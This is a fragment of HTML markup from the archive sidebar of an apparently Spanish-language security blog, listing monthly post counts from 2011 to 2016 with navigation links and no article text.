<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1467324000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1464732000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1462053600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1459461600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1456786800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1454281200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            23
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1451602800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            21
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1420066800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/'>
2015
</a>
<span class='post-count' dir='ltr'>
                            (
                            213
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1448924400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1446332400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1443650400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1441058400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1438380000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1435701600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1433109600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1430431200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1427839200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1425164400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1422745200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1420066800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2015/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1388530800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/'>
2014
</a>
<span class='post-count' dir='ltr'>
                            (
                            213
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1417388400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1414796400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1412114400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            21
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1409522400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1406844000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            12
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1404165600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1401573600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1398895200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1396303200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1393628400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1391209200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1388530800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2014/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            21
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1356994800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/'>
2013
</a>
<span class='post-count' dir='ltr'>
                            (
                            225
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1385852400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1383260400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1380578400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            22
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1377986400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1375308000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1372629600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            14
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1370037600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1367359200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1364767200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1362092400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1359673200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            21
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1356994800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2013/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1325372400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/'>
2012
</a>
<span class='post-count' dir='ltr'>
                            (
                            259
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1354316400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1351724400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            29
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1349042400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            24
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1346450400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            23
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1343772000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1341093600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            13
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1338501600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1335823200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            22
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1333231200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            22
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1330556400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            22
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1328050800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            22
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1325372400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2012/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            23
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1293836400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/'>
2011
</a>
<span class='post-count' dir='ltr'>
                            (
                            234
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1322694000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1320102000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            21
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1317420000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            22
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1314828000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1312149600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            20
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1309471200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
